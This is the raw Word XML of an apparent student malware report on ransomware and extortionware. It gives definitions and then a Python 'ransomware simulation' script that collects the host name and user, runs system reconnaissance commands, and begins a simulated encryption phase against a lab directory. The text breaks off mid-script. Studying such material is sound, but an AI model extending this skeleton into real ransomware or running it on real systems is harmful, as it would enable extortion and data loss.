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2AE2E" w14:textId="77777777" w:rsidR="00B95E87" w:rsidRPr="005F602B" w:rsidRDefault="006E6758" w:rsidP="003F1A9E">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F602B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve">Ransomware / </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F602B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>Extortionware</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F602B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Malware Report (Part 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68010748" w14:textId="77777777"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1. Malware Definition and Purpose</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A813691" w14:textId="77777777"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Ransomware is a type of malicious software designed to encrypt files or block access to systems until a ransom is paid. Extortionware is an extended form of ransomware that not only encrypts files but also steals sensitive data, threatening to publish it if the victim does not pay. The primary purpose of both is financial gain, business disruption, and unauthorized access to confidential information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A171140" w14:textId="77777777"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2. Architecture / Composition</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FD7D0D" w14:textId="77777777"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Below is a safe, educational pseudocode representation of ransomware architecture:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1318F0CA"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import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3EDA3D77"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from datetime import datetime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5574CE07"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import subprocess</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D10CD8A"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import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08AA0FA9" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F2788DA" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>attack_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>datetime.now</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>strftime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>("%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Y%m%d</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>_%H%M%S")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ABA17D2"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hostname = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>os.uname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>().</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>nodename</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="40309A3F"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username = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>os.getenv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>("USER", "unknown")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="239A3D41"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target = "/home/kali/test"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F2C9C56" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D767226"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gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>"=" * 60)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6405ECA7"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spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>f"RANSOMWARE</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> SIMULATION (LAB)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52549C22"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spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>f"Attack</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ID : {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>attack_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F6998C"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spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>f"Host</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">      : {hostname}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="196D577E"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spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>f"User</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">      : {username}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C24921"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spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>f"Target</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    : {target}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427C2DFC"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gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>"=" * 60)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FD02D3" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7562302A" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52DEC17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def </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>reconnaissance(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46B0654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print("\</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>+] RECONNAISSANCE PHASE")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7829D1A5" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="775C8F0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lastRenderedPageBreak/>
        <w:t xml:space="preserve">    commands = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34E771D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whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E06C91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["id"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="555CCFCB"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uname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>", "-a"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649C7C2E"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ps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>", "aux"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6254DDF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
    <w:p w14:paraId="6CD3D366" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1561D04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for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> in commands:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="647F7CDE"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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E64B62"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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>subprocess.run</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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capture_output</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>=True, timeout=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E6B64E"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gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>print(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>f"  [RECON] Executed: {' '.join(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>)}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47ECC80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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>time.sleep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(0.3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C2410E"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except:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74469CBC"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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F7D2A7" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6559425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def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>simulate_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>encryption</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C52A5C6"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print("\</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>+] ENCRYPTION PHASE (SIMULATED)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79AE702C" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3412409F"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if not </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>os.path</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.exists</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(target):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B45D852"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gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>print(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>"  [!] Target directory not found")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0188A35A"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return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71EF53D6" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05703607"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files = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD55E2B"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f for f in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>os.listdir</w:t>
